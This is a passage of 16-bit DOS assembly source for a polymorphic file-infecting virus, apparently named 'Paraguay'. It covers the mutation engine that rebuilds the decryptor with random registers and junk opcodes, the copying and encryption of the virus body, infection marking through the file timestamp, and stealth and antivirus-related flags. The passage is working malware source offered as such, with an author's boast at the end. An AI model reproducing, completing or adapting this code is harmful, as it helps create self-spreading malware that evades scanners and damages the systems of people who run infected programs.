             jmp Muto6
   Maldito_Jump9:
             jmp Muto5
   Maldito_Jump10:
             jmp Muto4


   ;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
   ;! HIPOCRESIA: Mute decryptor opcode x opcode. Copy heap (between others)    !
   ;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
   HIPOCRESIA:
           call segmentos
   DamePalabraRandomica:
           in ax,40h                       ; Encryption key
           or ax,ax
           je DamePalabraRandomica
           mov [Clave],ax

           in ax,40h                       ; Random number from port 40h
           mov dx,ax

           cmp al,36                       ; Regs selector
           jb Maldito_Jump7                ; with which we'll work
           cmp al,72                       ; in the decryptor.
           jb Maldito_Jump8                ; This is the beginning, that is
           cmp al,108                      ; where IP which CALL left
           jb Maldito_Jump9                ; on the stack will get popped
           cmp al,144                      ; and this way get the delta offset
           jb Maldito_Jump10               ; that goes into BP
           cmp al,180
           jb Muto3
           cmp al,216
           jb Muto2

   Muto1:  mov bx,offset Paso1             ; Mute, mute, mute y mute.
           mov [bx],0582fh                 ; DAS / POP AX
           mov bx,offset Paso2
           mov [bx],02d90h                 ; NOP / SUB AX
           mov bx,offset Paso3
           cmp dl,85d
           jb Little1
           cmp dl,170d
           jb Little12
           mov [bx],0c589h                 ; MOV BP,AX
           jmp Sigo
   Little1:mov [bx],0fb95h                 ; STI / XCHG BP,AX
           jmp Sigo
   Little12:mov [bx],0c587h                ; XCHG AX,BP
           jmp Sigo
   Muto2:  mov bx,offset Paso1
           mov [bx],05ef5h                 ; CMC / POP SI
           mov bx,offset Paso2
           mov [bx],0ee81h                 ; SUB SI
           mov bx,offset Paso3
           cmp dl,85d
           jb Little2
           cmp dl,170d
           jb Little22
           mov [bx],0f589h                 ; MOV BP,SI
           jmp Sigo
   Little2:mov [bx],0ee87h                 ; XCHG BP,SI  Theyre different opcodes!
           jmp Sigo
   Little22:mov [bx],0f587h                ; XCHG SI,BP  Thats why we get both
           jmp Sigo
   Muto3:  mov bx,offset Paso1
           mov [bx],0593fh                 ; AAS / POP CX
           mov bx,offset Paso2
           mov [bx],0e981h                 ; SUB CX
           mov bx,offset Paso3
           cmp dl,85d
           jb Little3
           cmp dl,170d
           jb Little32
           mov [bx],0cd89h                 ; MOV BP,CX
           jmp Sigo
   Little3:mov [bx],0e987h                 ; XCHG BP,CX
           jmp Sigo
   Little32:mov [bx],0cd87h                ; XCHG CX,BP
           jmp Sigo
   Muto4:  mov bx,offset Paso1
           mov [bx],05b27h                 ; DAA / POP BX
           mov bx,offset Paso2
           mov [bx],0eb81h                 ; SUB BX
           mov bx,offset Paso3
           cmp dl,85d
           jb Little4
           cmp dl,170d
           jb Little42
           mov [bx],0dd89h                 ; MOV BP,BX
           jmp Sigo
   Little4:mov [bx],0eb87h                 ; XCHG BP,BX
           jmp Sigo
   Little42:mov [bx],0dd87h                ; XCHG BX,BP
           jmp Sigo
   Muto5:  mov bx,offset Paso1
           mov [bx],05fcch                 ; INT 3 / POP DI
           mov bx,offset Paso2
           mov [bx],0ef81h                 ; SUB DI
           mov bx,offset Paso3
           cmp dl,85d
           jb Little5
           cmp dl,170d
           jb Little52
           mov [bx],0fd89h                 ; MOV BP,DI
           jmp Sigo
   Little5:mov [bx],0ef87h                 ; XCHG BP,DI
           jmp Sigo
   Little52:mov [bx],0fd87h                ; XCHG DI,BP
           jmp Sigo
   Muto6:  mov bx,offset Paso1
           mov [bx],05df8h                 ; CLC / POP BP
           mov bx,offset Paso2
           mov [bx],0ed81h                 ; SUB BP
           mov bx,offset Paso3             ; 2 garbage bytes
           mov cx,1
           call Ygramul
   Muto7:  mov bx,offset Paso1
           mov [bx],05af9h                 ; STC / POP DX
           mov bx,offset Paso2
           mov [bx],0ea81h                 ; SUB BX
           mov bx,offset Paso3
           cmp dl,85d
           jb Little7
           cmp dl,170d
           jb Little72
           mov [bx],0d589h                 ; MOV BP,DX
           jmp short Sigo
   Little7:mov [bx],0ea87h                 ; XCHG BP,DX
           jmp short Sigo
   Little72:mov [bx],0d587h                ; XCHG DX,BP


   Sigo:   xor ax,ax                       ; So that CX is more randomic
           in al,40h
           mul byte ptr Cinco
           cmp ax,Largor
           ja Sigo                         ; Must be less than wanted value
           xchg cx,ax
           mov ax,Largor
           sub ax,cx
           mov bx,(offset Paso7+1)         ; On their marks
           mov [bx],ax
           mov bx,(offset Paso8+2)
           mov [bx],cx

           sub ax,ax                       ; Divide the address from which
           in al,40h                       ; we'll start the decryption
           xchg cx,ax
           mov ax,offset Jeroglifico
           sub ax,cx
           mov bx,(offset Paso4+2)         ; Write values into memory
           mov [bx],ax
           mov bx,(offset Paso5+2)
           mov [bx],cx

           in al,40h
           cmp al,85
           jb Cambia3                      ; Select index register
           cmp al,170
           jb Cambia2
           mov bx,offset Paso4             ; LEA SI,[BP+XX]
           mov [bx],0b68dh
           mov bx,offset Paso5
           mov [bx],0c681h                 ; ADD SI,XX
           mov bx,offset Paso6
           mov [bx],0b956h                 ; PUSH SI / MOV CX
           mov bx,offset Paso9
           mov [bx],03481h                 ; XOR WORD PTR [SI]
           mov bx,offset Paso10
           test al,3                       ; Use other way
           jz MasPoly
           mov [bx],04646h                 ; INC SI / INC SI
           jmp AlBuffer
   MasPoly:mov [bx],0acach                 ; LODSB / LODSB
           jmp AlBuffer
   Cambia2:mov bx,offset Paso4             ; LEA BX,[BP+XX]
           mov [bx],09e8dh
           mov bx,offset Paso5
           mov [bx],0c381h                 ; ADD BX,XX
           mov bx,offset Paso6
           mov [bx],0b953h                 ; PUSH BX / MOV CX
           mov bx,offset Paso9
           mov [bx],03781h                 ; XOR WORD PTR [BX]
           mov bx,offset Paso10
           mov [bx],04343h                 ; INC BX / INC BX
           jmp AlBuffer
   Cambia3:mov bx,offset Paso4             ; LEA DI,[BP+XX]
           mov [bx],0be8dh
           mov bx,offset Paso5
           mov [bx],0c781h                 ; ADD DI,XX
           mov bx,offset Paso6
           mov [bx],0b957h                 ; PUSH DI / MOV CX
           mov bx,offset Paso9
           mov [bx],03581h                 ; XOR WORD PTR [DI]
           mov bx,offset Paso10
           mov [bx],04747h                 ; INC DI / INC DI


   AlBuffer:
           mov cx,200d                     ; Change opcode order in the table
           call MuTabla                    ; named MontonDeBasura

           sub dx,dx
           mov bx,offset Ensuciar          ; Add random garbage to the decryptor
   Basureo:xor cx,cx
           mov cx,[bx]
           inc bx
           inc bx
           push bx
           push dx
           mov bx,[bx]
           call Ygramul
           pop dx
           pop bx
           inc bx
           inc bx
           inc dx
           cmp dx,13
           jb Basureo

           mov cx,(Largor/2)               ; Copy virus to heap
           xor si,si
           mov di,offset CopiaVir
           rep movsw

           mov cx,Cripted                  ; Encrypt it
           mov si,(offset CopiaVir+Saltarlos)
           mov di,si                       ; To use the decryptor with any
           mov bx,di                       ; of the index registers
           call Desencriptor               ; chosen.
           ret


   Ensuciar:                               ; Locations of the decryptor in
           dw 09,offset Paraguay           ; which we'll insert garbage from
           dw 04,offset Junk02             ; MontonDeBasura
           dw 02,offset Junk03
           dw 06,offset Junk04
           dw 03,offset Junk05
           dw 05,offset Junk06
           dw 02,offset Junk07
           dw 04,offset Junk08
           dw 03,offset Junk09
           dw 07,offset Junk10
           dw 02,offset Junk11
           dw 04,offset Junk12
           dw 08,offset Junk13


   ;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
   ;! PongoFecha:  Restore victims date, and time with secs=60                  !
   ;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
   PongoFecha:
           mov ax,5701h                    ; Set
           db 0b9h                         ; mov cx,time
           Time dw 0                       ; Last modified time
           and cl,11100000b                ; Set as infected
           or cl,00011110b                 ; 30*2=60!
           db 0bah                         ; mov dx,date
           Date dw 0                       ; Last modified date
           pushf                           ; Call handler directly
           call dword ptr cs:[Real21h]
           ret                             ; And return


   ;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
   ;! Sub-Rutine used for pointer moves up to the end                           !
   ;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
   AlFinal:mov ax,04202h                   ; To the end
           xor cx,cx
           cwd                             ; XOR DX,DX
           int 21h
           ret


   Segmentos:                              ; DS:=CS  &  ES:=CS
           push cs
           push cs
           pop ds
           pop es
           ret


   ;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
   ;! MUTABLA: Exchange the trash opcodes position                              !
   ;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
   MuTabla:xor ax,ax
           in al,40h                       ; Random number from port 40h
           test al,1                       ; Is it even?
           jz YaEsPar
           inc al                          ; If not, make it even
   YaEsPar:mov si,offset MontonDeBasura    ; The table
           add si,ax                       ; Get a  2 byte-instruction
           mov dx,[si]                     ; into DX
           xor ax,ax
           in al,40h                       ; Another random number
           test al,1                       ; If not even, make it even
           jz Alli
           inc al
   Alli:   mov di,offset MontonDeBasura    ; Garbage 2-byte table
           add di,ax                       ; Get the instruction
           mov bx,[di]                     ; into bx
           mov [si],bx                     ; Exchange its positions
           mov [di],dx
           loop MuTabla                    ; CX times
           ret



   ;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
   ;! YGRAMUL: Chose random junk-instructions and put them into memory          !
   ;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
   Ygramul:xor di,di                       ; Garbage intruder
   Otro:   xor ax,ax                       ; Ygramul, the mutant in Endless Story
           in al,40h                       ; Random number
           test al,1                       ; Is it even?
           jz Aqui
           inc al                          ; Nope, add one
   Aqui:   mov si,offset MontonDeBasura
           add si,ax                       ; Get the instruction
           mov ax,si
           mov dx,[si]
           mov [bx],dx                     ; Write it in its position
           inc bx                          ; add bx,2 (index)
           inc bx
           inc di                          ; Update the counter
           cmp di,cx                       ; Enough?
           jne Otro
           ret


   ;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
   ;! Mont¢nDeBasura: The garbage instruction which variate the decryptor       !
   ;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
   MontonDeBasura:                         ; garbage heap

   ;      Instrucci¢n                      Opcode
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Ä Ä Ä Ä Ä Ä
           db 087h,0c0h                    ; xchg ax,ax
           xchg bx,bx                      ; 87 DB
           xchg cx,cx                      ; 87 C9
           xchg dx,dx                      ; 87 D2
           xchg si,si                      ; 87 F6
           xchg di,di                      ; 87 FF
           xchg bp,bp                      ; 87 ED
           xchg al,al                      ; 86 C0
           xchg bl,bl                      ; 86 DB
           xchg cl,cl                      ; 86 C9
           xchg dl,dl                      ; 86 D2
           xchg ah,ah                      ; 86 E4
           xchg bh,bh                      ; 86 FF
           xchg ch,ch                      ; 86 ED
           xchg dh,dh                      ; 86 F6
           cld                             ; FB
           int 03h                         ; CC
           nop                             ; 90
           nop                             ; 90
           pushf                           ; 9C
           popf                            ; 9D
           push es                         ; 06
           pop es                          ; 07
           inc ax                          ; 40
           dec ax                          ; 48
           inc bx                          ; 43
           dec bx                          ; 4B
           inc cx                          ; 41
           dec cx                          ; 49
           inc dx                          ; 42
           dec dx                          ; 4A
           std                             ; FD
           cld                             ; FC
           stc                             ; F9
           clc                             ; F8
           jmp short $+2                   ; EB 00
           jc $+2                          ; 72 00
           jnc $+2                         ; 73 00
           jz $+2                          ; 74 00
           jnz $+2                         ; 75 00
           jpo $+2                         ; 7B 00
           jpe $+2                         ; 7A 00
           jno $+2                         ; 71 00
           jg $+2                          ; 7F 00
           js $+2                          ; 78 00
           or ax,ax                        ; 0B C0
           or bx,bx                        ; 0B DB
           or cx,cx                        ; 0B C9
           or dx,dx                        ; 0B D2
           or si,si                        ; 09 F6
           or di,di                        ; 09 FF
           or bp,bp                        ; 09 ED
           or ah,ah                        ; 08 E4
           or al,al                        ; 08 C0
           or bh,bh                        ; 08 FF
           or bl,bl                        ; 08 DB
           or ch,ch                        ; 08 ED
           or cl,cl                        ; 08 C9
           or dh,dh                        ; 08 F6
           or dl,dl                        ; 08 D2
           and ax,ax                       ; 23 C0
           and bx,bx                       ; 23 DB
           and cx,cx                       ; 23 C9
           and dx,dx                       ; 23 D2
           and si,si                       ; 21 F6
           and di,di                       ; 21 FF
           and bp,bp                       ; 21 ED
           and ah,ah                       ; 20 E4
           and al,al                       ; 20 C0
           and bh,bh                       ; 20 FF
           and bl,bl                       ; 20 DB
           and ch,ch                       ; 20 ED
           and cl,cl                       ; 20 C9
           and dh,dh                       ; 20 F6
           and dl,dl                       ; 20 D2
           mov ax,ax                       ; 89 C0
           mov bx,bx                       ; 89 DB
           mov cx,cx                       ; 89 C9
           mov dx,dx                       ; 89 D2
           mov si,si                       ; 89 F6
           mov di,di                       ; 89 FF
           mov bp,bp                       ; 89 ED
           mov sp,sp                       ; 89 E4
           mov ah,ah                       ; 88 E4
           mov al,al                       ; 88 C0
           mov bh,bh                       ; 88 FF
           mov bl,bl                       ; 88 DB
           mov ch,ch                       ; 88 ED
           mov cl,cl                       ; 88 C9
           mov dh,dh                       ; 88 F6
           mov dl,dl                       ; 88 D2
           cmp ax,ax                       ; 3B C0
           cmp ax,bx                       ; 3B C3
           cmp ax,cx                       ; 3B C1
           cmp ax,dx                       ; 3B C2
           cmp ax,si                       ; 3B C6
           cmp ax,di                       ; 3B C7
           cmp ax,bp                       ; 3B C5
           cmp bx,ax                       ; 3B D8
           cmp bx,bx                       ; 3B DB
           cmp bx,cx                       ; 3B D9
           cmp bx,dx                       ; 3B DA
           cmp bx,si                       ; 3B DE
           cmp bx,di                       ; 3B DF
           cmp bx,bp                       ; 3B DD
           cmp cx,ax                       ; 3B C8
           cmp cx,bx                       ; 3B CB
           cmp cx,cx                       ; 3B C9
           cmp cx,dx                       ; 3B CA
           cmp cx,si                       ; 3B CE
           cmp cx,di                       ; 3B CF
           cmp cx,bp                       ; 3B CD
           cmp dx,ax                       ; 3B D0
           cmp dx,bx                       ; 3B D3
           cmp dx,cx                       ; 3B D1
           cmp dx,dx                       ; 3B D2
           cmp dx,si                       ; 3B D6
           cmp dx,di                       ; 3B D7
           cmp dx,bp                       ; 3B D5
           cmp si,ax                       ; 3B F0
           cmp si,bx                       ; 3B F3
           cmp si,cx                       ; 3B F1
           cmp si,dx                       ; 3B F2
           cmp si,si                       ; 3B F6
           cmp si,di                       ; 3B F7
           cmp si,bp                       ; 3B F5
           cmp di,ax                       ; 3B F8
           cmp di,bx                       ; 3B FB
           cmp di,cx                       ; 3B F9
           cmp di,dx                       ; 3B FA
           cmp di,si                       ; 3B FE
           cmp di,di                       ; 3B FF
           cmp di,bp                       ; 3B FD
           cmp bp,ax                       ; 3B E8
           cmp bp,bx                       ; 3B EB
           cmp bp,cx                       ; 3B E9
           cmp bp,dx                       ; 3B EA
           cmp bp,si                       ; 3B EE
           cmp bp,di                       ; 3B EF
           cmp bp,bp                       ; 3B ED


   Omega:                                  ; End of virus on the file
   HeavyMetal   dw 0                       ; Heavy Metal even in RAM ;)
   Vsuck        db 0                       ; Vsafe's flags
   HacerStealth db 1                       ; Flag to make or not the stealth
   Handle       dw 0                       ; File's key
   Atributos    db 0                       ; File's attribs
   Vieja24h     dd 0                       ; 24h's old handler
   CopiaVir     db Largor dup('P')         ; Here will go the encrypted virus
   Cabecera     db 45d dup(0)              ; We will read the file here

   FakeHoste: mov ax,4c00h                 ; Turn back to DOS
              int 21h

   End Paraguay                            ; A virus never is finished, just
                                           ; abandonated. Now is my time ;)
